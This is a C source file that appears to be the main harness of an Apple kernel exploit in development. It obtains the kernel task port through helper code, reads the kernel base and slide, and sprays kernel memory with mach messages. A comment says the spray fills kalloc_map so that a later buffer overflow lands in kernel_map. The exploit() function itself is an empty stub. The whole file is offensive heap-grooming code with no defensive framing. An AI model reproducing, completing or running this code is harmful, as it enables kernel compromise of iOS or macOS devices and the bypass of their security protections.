#include <stdio.h>

#include "print.h"
#include "ioaccel.h"
#include "iosurface.h"
#include "exploit_utilities.h"
#include "exploit.h"

// helper
#include "helper/krw.h"
#include "helper/offsets.h"
#include "helper/kexecute.h"
#include "helper/find_port.h"
#include "helper/find_shmem.h"

extern mach_port_t tfp0;

// Kernel Page Size.
extern mach_vm_size_t pagesize;

int exploit(void) {

	return 0;
}

int main(int argc, char *argv[], char *envp[]) {
	IOAccelerator_init();
	IOSurface_init();

    // helper
    offsets_init();
	init_tfp0(); 
	INFO("tfp0: 0x%" PRIx32 "\n", tfp0);

	int r = get_kbase(&kbase);
    INFO("get_kbase ret: %d, kbase: 0x%llx, kslide: 0x%llx\n", r, kbase, kslide);
    //

    void *data = NULL;
	mach_port_t ports[port_cnt] = {};

	// setup 200 ports for later use
    for (int i = 0; i < port_cnt; i++) {
        ports[i] = new_mach_port();
		INFO("got new_mach_port[%d]: 0x%x\n", i, ports[i]);
    }

	int port_i = 0;
#define POP_PORT() ports[port_i++]

// ----------- heap pre-exploit setup ----------- //
    INFO("Doing stage 0 heap setup\n");

	// fill kalloc_map so new allocations are always done in kernel_map (where our buffer that will get overflowed is)
    mach_port_t saved_ports[10];
    mach_msg_size_t msg_size = message_size_for_kalloc_size(7 * pagesize) - sizeof(struct simple_msg);
    data = calloc(1, msg_size);
    size_t stage0_sz = pagesize == 0x4000 ? 10 MB : 5 MB;
    for (int i = 0; i < 10; i++) {
        saved_ports[i] = POP_PORT();

        // set signature
        if((i % 2) == 0) {memset(data, 0x74, msg_size);}
        else {memset(data, 0x72, msg_size);}

        for (int j = 0; j < stage0_sz / (7 * pagesize); j++) {
            
            kern_return_t ret = send_message(saved_ports[i], data, msg_size);
            
            if (ret) {
                ERROR("Failed to send message\n");
                goto err;
            }
        }

        // obtain msgdata_kptr
        uint64_t kmsgdata_kptr = find_kmsgdata_from_port(saved_ports[i]);
        INFO("saved_ports[%d]'s msgdata_kptr = 0x%llx\n", i, kmsgdata_kptr);
    }
    
    
    free(data);
    data = NULL;

    getchar();


err:
	// clean 200 ports
	for (int i = 0; i < port_cnt; i++) {
        if (ports[i] /*&& ports[i] != new_tfp0*/) mach_port_destroy(mach_task_self(), ports[i]);
    }

    if (data) free(data);
	
	IOAccelerator_deinit();
	IOSurface_deinit();
	return 0;
}
